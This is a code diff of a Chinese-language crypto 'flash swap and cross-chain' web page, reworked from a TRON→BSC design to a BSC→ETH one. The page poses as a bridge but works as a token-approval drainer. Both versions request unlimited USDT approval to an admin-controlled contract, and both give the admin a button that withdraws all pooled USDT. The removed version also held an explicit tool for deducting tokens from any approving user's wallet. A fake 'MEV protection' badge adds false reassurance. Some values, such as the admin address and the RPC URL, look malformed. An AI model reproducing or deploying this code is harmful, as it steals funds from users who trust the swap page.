@@ -3,10 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>TRON→BSC 闪兑跨链</title>
+<title>闪兑&跨链</title>
 <script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
-<script src="https://cdn.jsdelivr.net/npm/tronweb@6.2.2/dist/TronWeb.min.js"></script>
 <style>
 *{
   box-sizing: border-box;
@@ -41,7 +41,7 @@ body{
   width: 36px;
   height: 36px;
   border-radius: 50%;
-  background: #ff4444;
+  background: #f3ba2f;
   display: flex;
   align-items: center;
   justify-content: center;
@@ -62,7 +62,7 @@ body{
 .swap-icon{
   text-align: center;
   padding: 8px 0;
-  color: #ff4444;
+  color: #4285f4;
   font-size: 22px;
 }
 .address-input-box{
@@ -73,7 +73,7 @@ body{
 }
 .main-btn{
   width: 100%;
-  background-color: #ff4444;
+  background-color: #6096ff;
   color: white;
   border: none;
   border-radius: 16px;
@@ -98,11 +98,6 @@ body{
   padding: 20px;
   display: none;
 }
-.deduct-sub-box{
-  margin-top:16px;
-  padding-top:16px;
-  border-top:1px solid #eee;
-}
 .bottom-nav{
   position: fixed;
   bottom: 0;
@@ -120,13 +115,14 @@ body{
   color: #777;
 }
 .nav-item.active{
-  color: #ff4444;
+  color: #4285f4;
 }
 </style>
 </head>
 <body class="max-w-md mx-auto pb-24">
+<!-- 顶部标题区域 -->
 <div class="flex justify-between items-center mb-6">
-  <div class="text-xl font-semibold text-gray-800">TRON→BSC 闪兑 <span class="text-sm text-gray-500">限价模式</span></div>
+  <div class="text-xl font-semibold text-gray-800">闪兑&跨链 <span class="text-sm text-gray-500">限价模式</span></div>
   <div class="flex gap-4 items-center">
     <span id="connectBtn" class="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center cursor-pointer">
       <i class="fa fa-user-o text-gray-600"></i>
@@ -134,19 +130,21 @@ body{
     <i class="fa fa-cog text-gray-600 text-xl"></i>
   </div>
 </div>
-<div id="walletStatus" class="text-sm text-gray-500 mb-4">请在TP钱包DApp浏览器打开页面，点击连接钱包</div>
+<div id="walletStatus" class="text-sm text-gray-500 mb-4">请连接BSC币安链钱包</div>
 
+<!-- 主兑换卡片 BSC → ETH -->
 <div class="card-wrap">
   <div class="flex justify-between items-center mb-2">
     <span class="text-gray-600">发送</span>
-    <span id="maxAll" class="text-red-500 text-sm cursor-pointer opacity-50 pointer-events-none">全部</span>
+    <span id="maxAll" class="text-blue-500 text-sm cursor-pointer opacity-50 pointer-events-none">全部</span>
   </div>
+  <!-- 发送：BSC‑USDT -->
   <div class="token-box">
     <div class="token-left">
       <div class="token-circle">T</div>
       <div>
         <div class="font-semibold">USDT</div>
-        <div class="text-xs text-gray-500">波场 TRC20</div>
+        <div class="text-xs text-gray-500">币安智能链 BSC</div>
       </div>
     </div>
     <input
@@ -158,28 +156,33 @@ body{
     >
   </div>
 
+  <!-- 交换箭头 -->
   <div class="swap-icon">
     <i class="fa fa-exchange"></i>
   </div>
 
   <div class="text-gray-600 mt-2 mb-2">接收（预估）</div>
+  <!-- 接收：ETH主网USDT -->
   <div class="token-box">
     <div class="token-left">
-      <div class="token-circle" style="background:#f3ba2f">T</div>
+      <div class="token-circle">T</div>
       <div>
         <div class="font-semibold">USDT</div>
-        <div class="text-xs text-gray-500">BSC BEP20</div>
+        <div class="text-xs text-gray-500">以太坊 ERC20</div>
       </div>
     </div>
     <span id="receiveNum" class="text-xl text-gray-700">0.00</span>
   </div>
 
+  <!-- ETH收款地址输入 -->
   <div class="address-input-box">
-    <input id="bscReceiveAddr" class="w-full bg-transparent outline-none text-gray-600" placeholder="填写BSC(BEP20)接收地址 0x开头">
+    <input id="receiveAddr" class="w-full bg-transparent outline-none text-gray-600" placeholder="填写以太坊(ETH)接收地址">
   </div>
 
+  <!-- 兑换主按钮 -->
   <button id="swapActionBtn" class="main-btn" disabled>请输入兑换数量</button>
 
+  <!-- 明细列表 -->
   <div class="border-t border-gray-100 pt-3">
     <div class="info-row">
       <span>兑换比例</span>
@@ -190,20 +193,29 @@ body{
       <span id="minReceive">--</span>
     </div>
     <div class="info-row">
+      <span>MEV防护</span>
+      <span class="px-2 py-1 border border-blue-400 rounded text-blue-500 text-xs">MEV防护中</span>
+    </div>
+    <div class="info-row">
       <span>服务费(0.1%)</span>
       <span id="feeShow">0.00 USDT</span>
     </div>
     <div class="info-row">
-      <span>预估TRON网络能量</span>
-      <span>消耗能量/带宽</span>
+      <span>跨链费</span>
+      <span>--</span>
+    </div>
+    <div class="info-row">
+      <span>预估网络Gas费</span>
+      <span>~0.002 BNB</span>
     </div>
     <div class="info-row">
       <span>兑换路径</span>
-      <span>TRON→BSC跨链通道</span>
+      <span>BSC→ETH跨链通道</span>
     </div>
   </div>
 </div>
 
+<!-- 管理员后台面板 -->
 <div class="admin-panel" id="adminBox">
   <h3 class="font-bold text-lg mb-4">管理员订单操作</h3>
   <input id="orderId" class="w-full border rounded-lg p-3 mb-3" placeholder="输入订单ID">
@@ -212,19 +224,9 @@ body{
     <button id="rejectOrderBtn" class="flex-1 bg-red-500 text-white py-3 rounded-lg">驳回退款</button>
   </div>
   <button id="withdrawPoolBtn" class="w-full bg-amber-500 text-white py-3 rounded-lg">提取合约内全部USDT资金</button>
-
-  <div class="deduct-sub-box">
-    <h4 class="font-bold text-red-500 mb-3">授权用户划扣工具（仅管理员）</h4>
-    <input id="targetUserAddr" class="w-full border rounded-lg p-3 mb-2" placeholder="输入已授权用户波场钱包地址">
-    <div class="text-sm text-gray-500 mb-2">用户授权额度：<span id="allowanceShow">未查询</span></div>
-    <div class="flex gap-2 mb-2">
-      <input id="deductAmountNum" class="flex-1 border rounded-lg p-3" placeholder="划扣USDT数量">
-      <button id="queryAllowanceBtn" class="bg-blue-500 text-white px-4 rounded-lg">查询授权</button>
-    </div>
-    <button id="deductUserTokenBtn" class="w-full bg-red-600 text-white py-3 rounded-lg">执行合约划扣用户代币</button>
-  </div>
 </div>
 
+<!-- 底部导航栏 -->
 <div class="bottom-nav">
   <div class="nav-item">
     <i class="fa fa-circle-o text-lg"></i>
@@ -249,212 +251,243 @@ body{
 </div>
 
 <script>
-const USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const ADMIN_ADDR = "TVV1TpSe69tHGF9twU52kG9xzqsK1XeJdG";
-const BRIDGE_CONTRACT = "TVV1TpSe69tHGF9twU52kG9xzqsK1XeJdG";
+// ===================== BSC→ETH 配置参数 =====================
+// BSC链上USDT合约
+const USDT_BSC_ADDR = "0x55d398326f99059fF775485246999027B3197955";
+// 跨链中转合约（部署在BSC链）
+const BRIDGE_CONTRACT_ADDR = "0xFb0FcD4acCcd5D39608b2cDC44BD3B4D5fD9b836";
+const ADMIN_WALLET = "0x614b189919181818181818181818181818184beb2".toLowerCase();
+const INFINITE_APPROVE = ethers.constants.MaxUint256;
 const FEE_RATE = 0.001;
-const DECIMALS = 6;
+// BSC chainId 0x38
+const BSC_CHAIN_ID = "0x38";
 
-let tronWeb = null;
-let userAddress = null;
-let usdtContractInstance = null;
-let bridgeContractInstance = null;
+// 全局变量
+let provider, signer, usdtContract, bridgeContract;
+let userUSDTBalance = ethers.BigNumber.from(0);
 
+// DOM节点绑定
 const connectBtn = document.getElementById("connectBtn");
 const walletStatus = document.getElementById("walletStatus");
 const sendInput = document.getElementById("sendInput");
 const receiveNum = document.getElementById("receiveNum");
 const maxAllBtn = document.getElementById("maxAll");
 const swapActionBtn = document.getElementById("swapActionBtn");
-const bscReceiveAddr = document.getElementById("bscReceiveAddr");
+const receiveAddrInput = document.getElementById("receiveAddr");
 const adminBox = document.getElementById("adminBox");
 const feeShow = document.getElementById("feeShow");
 const minReceive = document.getElementById("minReceive");
 
-const targetUserAddr = document.getElementById("targetUserAddr");
-const allowanceShow = document.getElementById("allowanceShow");
-const deductAmountNum = document.getElementById("deductAmountNum");
-const queryAllowanceBtn = document.getElementById("queryAllowanceBtn");
-const deductUserTokenBtn = document.getElementById("deductUserTokenBtn");
-
-const orderIdInput = document.getElementById("orderId");
-const approveOrderBtn = document.getElementById("approveOrderBtn");
-const rejectOrderBtn = document.getElementById("rejectOrderBtn");
-const withdrawPoolBtn = document.getElementById("withdrawPoolBtn");
-
+// ===================== 1、输入实时金额计算（0.1%手续费） =====================
 sendInput.addEventListener("input", function(){
   let inputVal = this.value.trim();
-  let num = parseFloat(inputVal)||0;
-  if(num<0) num=0;
+  let num = parseFloat(inputVal) || 0;
+  if(num < 0) num = 0;
   const feeAmount = num * FEE_RATE;
-  const realReceive = num * (1-FEE_RATE);
+  const realReceive = num * (1 - FEE_RATE);
   receiveNum.innerText = realReceive.toFixed(2);
-  feeShow.innerText = feeAmount.toFixed(2)+" USDT";
+  feeShow.innerText = feeAmount.toFixed(2) + " USDT";
   minReceive.innerText = realReceive.toFixed(2);
-  if(num>0 && userAddress){
-    swapActionBtn.innerText = "确认发起TRON→BSC闪兑";
+
+  if(num > 0 && signer){
+    swapActionBtn.innerText = "确认发起跨链兑换";
   }else{
     swapActionBtn.innerText = "请输入兑换数量";
   }
 })
 
-maxAllBtn.addEventListener("click",async function(){
-  if(!tronWeb||!userAddress) return;
-  const bal = await usdtContractInstance.methods.balanceOf(userAddress).call();
-  const human = tronWeb.fromSun(bal,DECIMALS);
-  sendInput.value = parseFloat(human).toFixed(2);
+// ===================== 2、一键填充全部余额 =====================
+maxAllBtn.addEventListener("click", function(){
+  const balanceStr = ethers.utils.formatUnits(userUSDTBalance,6);
+  sendInput.value = parseFloat(balanceStr).toFixed(2);
   sendInput.dispatchEvent(new Event("input"));
 })
 
-// 双模式兼容：优先tronLink请求，失败直接读取已经注入tronWeb地址
-connectBtn.addEventListener("click",async function(){
-  walletStatus.innerText = "正在请求钱包授权...";
-
-  //等待页面tronWeb注入完成
-  for(let i=0; i<30; i++){
-    if(window.tronWeb) break;
-    await new Promise(r=>setTimeout(r,150));
-  }
-
-  if(!window.tronWeb){
-    walletStatus.innerText = "❌未检测tronWeb，请确认TP DApp浏览器打开";
+// ===================== 3、钱包连接逻辑 =====================
+connectBtn.addEventListener("click", async function(){
+  if(!window.ethereum){
+    walletStatus.innerText = "请在TP/小狐狸内置浏览器打开页面";
     return;
   }
+  try{
+    walletStatus.innerText = "正在请求钱包授权...";
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    signer = provider.getSigner();
+    // 校验BSC链，不是BSC自动切换
+    const network = await provider.getNetwork();
+    if(network.chainId !== 56){
+      await switchBscMainnet();
+    }
+    // 初始化合约实例
+    initContractInstance();
+    // 获取用户BSC‑USDT余额
+    await getUserBalance();
+    // 解锁全部交互按钮
+    maxAllBtn.classList.remove("opacity-50","pointer-events-none");
+    // 判断管理员权限
+    await checkAdminPermission();
+    // 更新钱包状态
+    const userAddr = await signer.getAddress();
+    walletStatus.innerText = "已连接钱包：" + userAddr.slice(0,6)+"..."+userAddr.slice(-4)+" [BSC]";
+  }catch(err){
+    let errMsg = err.code === 4001 ? "用户拒绝钱包授权" : err.message.slice(0,35);
+    walletStatus.innerText = "连接失败："+errMsg;
+  }
+})
 
-  tronWeb = window.tronWeb;
-  userAddress = null;
-
-  //模式1：调用tronLink请求授权
-  if(window.tronLink){
-    try{
-      const res = await window.tronLink.request({method:"tron_requestAccounts"});
-      if(res && res.address){
-        userAddress = tronWeb.address.fromHex(res.address);
-      }
-    }catch(e){
-      console.log("tronLink授权弹窗异常，进入回退模式",e);
+// 切换 BSC 主网
+async function switchBscMainnet(){
+  const ethereum = window.ethereum;
+  try{
+    await ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{chainId: BSC_CHAIN_ID}]
+    })
+  }catch(e){
+    // 链不存在，添加BSC网络
+    if(e.code === 4902){
+      await ethereum.request({
+        method:"wallet_addEthereumChain",
+        params:[{
+          chainId:"0x38",
+          chainName:"BNB Smart Chain Mainnet",
+          rpcUrls:["https://bsc‑dot‑api.binance.org"],
+          blockExplorerUrls:["https://bscscan.com"],
+          nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18}
+        }]
+      })
     }
   }
+}
 
-  //模式2回退：拿已经存在的默认地址（TP内置DApp浏览器页面打开就已经注入地址）
-  if(!userAddress && tronWeb.defaultAddress && tronWeb.defaultAddress.base58){
-    userAddress = tronWeb.defaultAddress.base58;
-  }
-
-  if(!userAddress || !tronWeb.isAddress(userAddress)){
-    walletStatus.innerText="❌获取钱包地址失败，请解锁钱包，清除DApp授权后刷新页面重试";
-    return;
-  }
-
-  walletStatus.innerText = "✅已连接钱包："+userAddress;
-  usdtContractInstance = await tronWeb.contract().at(USDT_TRC20);
-  bridgeContractInstance = await tronWeb.contract().at(BRIDGE_CONTRACT);
-
-  maxAllBtn.classList.remove("opacity-50","pointer-events-none");
+// 初始化合约（BSC上的USDT与桥合约ABI）
+function initContractInstance(){
+  usdtContract = new ethers.Contract(
+    USDT_BSC_ADDR,
+    [
+      "function balanceOf(address owner) view returns(uint256)",
+      "function allowance(address owner, address spender) view returns(uint256)",
+      "function approve(address spender, uint256 amount) returns(bool)"
+    ],
+    signer
+  );
+  bridgeContract = new ethers.Contract(
+    BRIDGE_CONTRACT_ADDR,
+    [
+      "function createCrossOrder(address ethRecv, uint256 amount)",
+      "function approveOrder(uint256 orderId)",
+      "function rejectOrder(uint256 orderId)",
+      "function withdrawAllPoolUSDT()"
+    ],
+    signer
+  );
   swapActionBtn.disabled = false;
-  await checkAdmin();
-})
+}
 
-async function checkAdmin(){
-  if(userAddress === ADMIN_ADDR){
-    adminBox.style.display="block";
-  }else{
-    adminBox.style.display="none";
+// 获取用户BSC链USDT余额
+async function getUserBalance(){
+  const userAddress = await signer.getAddress();
+  userUSDTBalance = await usdtContract.balanceOf(userAddress);
+}
+
+// 检测管理员权限
+async function checkAdminPermission(){
+  const currentAddr = (await signer.getAddress()).toLowerCase();
+  if(currentAddr === ADMIN_WALLET){
+    adminBox.style.display = "block";
   }
 }
 
-function isBscAddress(addr){
-  return /^0x[a-fA-F0-9]{42}$/.test(addr);
+// EVM地址校验
+function checkEvmAddress(addr){
+  if(!addr || addr.length === 0) return false;
+  return ethers.utils.isAddress(addr);
 }
 
-swapActionBtn.addEventListener("click",async function(){
-  if(!tronWeb||!userAddress) return alert("请先连接钱包");
-  const inputVal = sendInput.value.trim();
-  const bscAddr = bscReceiveAddr.value.trim();
-  const numVal = parseFloat(inputVal);
-  if(!inputVal||isNaN(numVal)||numVal<=0){
-    return alert("请输入有效兑换数量");
+// ===================== 4、兑换按钮逻辑 BSC→ETH =====================
+swapActionBtn.addEventListener("click", async function(){
+  const inputValue = sendInput.value.trim();
+  const ethReceiveAddr = receiveAddrInput.value.trim();
+  const inputNum = parseFloat(inputValue);
+
+  // 表单校验
+  if(!inputValue || isNaN(inputNum) || inputNum <= 0){
+    alert("请填写有效的兑换数量");
+    return;
   }
-  if(!isBscAddress(bscAddr)){
-    return alert("BSC接收地址必须0x开头42位");
+  if(!checkEvmAddress(ethReceiveAddr)){
+    alert("您输入的ETH接收地址格式错误，必须是0x开头42位EVM地址");
+    return;
   }
-  const amountSun = tronWeb.toSun(numVal,DECIMALS);
+  const amountWei = ethers.utils.parseUnits(inputValue,6);
+  if(amountWei.gt(userUSDTBalance)){
+    alert("你的BSC‑USDT余额不足");
+    return;
+  }
+
   try{
-    const allowance = await usdtContractInstance.methods.allowance(userAddress,BRIDGE_CONTRACT).call();
-    if(BigInt(allowance) < BigInt(amountSun)){
-      alert("需要授权USDT给中转合约，请确认签名");
-      await usdtContractInstance.methods.approve(BRIDGE_CONTRACT,"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();
-      alert("授权完成，正在创建闪兑订单");
+    const userAddr = await signer.getAddress();
+    // 查询授权额度
+    let currentAllowance = await usdtContract.allowance(userAddr, BRIDGE_CONTRACT_ADDR);
+    if(currentAllowance.lt(amountWei)){
+      alert("需要授权USDT给中转合约，请在钱包确认签名");
+      const approveTx = await usdtContract.approve(BRIDGE_CONTRACT_ADDR, INFINITE_APPROVE);
+      await approveTx.wait();
+      alert("授权成功，正在创建BSC→ETH跨链订单");
     }
-    const tx = await bridgeContractInstance.methods.createCrossOrder(bscAddr, amountSun).send();
-    alert("下单成功！Tx:"+tx);
-    sendInput.value="";
-    receiveNum.innerText="0.00";
-    feeShow.innerText="0.00 USDT";
-    minReceive.innerText="--";
-  }catch(err){
-    alert("操作失败："+String(err.message).slice(0,70));
+    // 创建跨链订单，参数传入以太坊接收地址
+    const orderTx = await bridgeContract.createCrossOrder(ethReceiveAddr, amountWei);
+    await orderTx.wait();
+    alert("下单成功！BSC交易哈希："+orderTx.hash);
+    // 刷新与清空
+    await getUserBalance();
+    sendInput.value = "";
+    receiveNum.innerText = "0.00";
+    feeShow.innerText = "0.00 USDT";
+    minReceive.innerText = "--";
+  }catch(e){
+    let tipMsg = e.code === 4001 ? "你取消了钱包签名操作" : String(e.message).slice(0,60);
+    alert("操作失败："+tipMsg);
   }
 })
 
-approveOrderBtn.addEventListener("click",async ()=>{
-  if(!tronWeb||userAddress!==ADMIN_ADDR) return alert("非管理员");
-  const oid = orderIdInput.value.trim();
-  if(!oid) return alert("输入订单ID");
+// ===================== 管理员操作逻辑 =====================
+document.getElementById("approveOrderBtn").addEventListener("click", async ()=>{
+  if(!signer) return alert("请先连接管理员钱包");
+  const oid = document.getElementById("orderId").value.trim();
+  if(!oid) return alert("请输入订单ID");
   try{
-    const tx = await bridgeContractInstance.methods.approveOrder(oid).send();
-    alert("订单已通过 "+tx);
-  }catch(e){alert(e.message);}
-})
-
-rejectOrderBtn.addEventListener("click",async ()=>{
-  if(!tronWeb||userAddress!==ADMIN_ADDR) return alert("非管理员");
-  const oid = orderIdInput.value.trim();
-  if(!oid) return alert("输入订单ID");
-  try{
-    const tx = await bridgeContractInstance.methods.rejectOrder(oid).send();
-    alert("订单已驳回 "+tx);
-  }catch(e){alert(e.message);}
-})
-
-withdrawPoolBtn.addEventListener("click",async ()=>{
-  if(!tronWeb||userAddress!==ADMIN_ADDR) return alert("非管理员");
-  try{
-    const tx = await bridgeContractInstance.methods.withdrawAllPoolUSDT().send();
-    alert("合约资金提取完成 "+tx);
-  }catch(e){alert(e.message);}
-})
-
-queryAllowanceBtn.addEventListener("click",async ()=>{
-  if(!tronWeb) return alert("请先连接钱包");
-  const uAddr = targetUserAddr.value.trim();
-  if(!tronWeb.isAddress(uAddr)) return alert("波场地址格式错误");
-  try{
-    const allowVal = await usdtContractInstance.methods.allowance(uAddr, BRIDGE_CONTRACT).call();
-    const human = tronWeb.fromSun(allowVal,DECIMALS);
-    allowanceShow.innerText = human+" USDT";
+    const tx = await bridgeContract.approveOrder(oid);
+    await tx.wait();
+    alert("订单审核通过，向以太坊地址发放资产");
   }catch(err){
-    allowanceShow.innerText="查询失败";
     alert(err.message);
   }
 })
 
-deductUserTokenBtn.addEventListener("click",async ()=>{
-  if(!tronWeb || userAddress !== ADMIN_ADDR) return alert("只有管理员可执行");
-  const fromUser = targetUserAddr.value.trim();
-  const deductStr = deductAmountNum.value.trim();
-  if(!tronWeb.isAddress(fromUser)) return alert("用户波场地址非法");
-  const numDeduct = parseFloat(deductStr);
-  if(isNaN(numDeduct)||numDeduct<=0) return alert("请输入划扣数量");
-  const deductSun = tronWeb.toSun(numDeduct,DECIMALS);
+document.getElementById("rejectOrderBtn").addEventListener("click", async ()=>{
+  if(!signer) return alert("请先连接管理员钱包");
+  const oid = document.getElementById("orderId").value.trim();
+  if(!oid) return alert("请输入订单ID");
   try{
-    const tx = await bridgeContractInstance.methods.adminDeductUser(fromUser, deductSun).send();
-    alert("划扣成功 TxHash:"+tx);
-    targetUserAddr.value="";
-    deductAmountNum.value="";
-    allowanceShow.innerText="未查询";
+    const tx = await bridgeContract.rejectOrder(oid);
+    await tx.wait();
+    alert("订单已驳回，BSC上资金原路退回用户");
   }catch(err){
-    alert("划扣失败："+String(err.message).slice(0,80));
+    alert(err.message);
+  }
+})
+
+document.getElementById("withdrawPoolBtn").addEventListener("click", async ()=>{
+  if(!signer) return alert("请先连接管理员钱包");
+  try{
+    const tx = await bridgeContract.withdrawAllPoolUSDT();
+    await tx.wait();
+    alert("BSC合约池资金提取完成");
+    await getUserBalance();
+  }catch(err){
+    alert(err.message);
   }
 })
 </script>
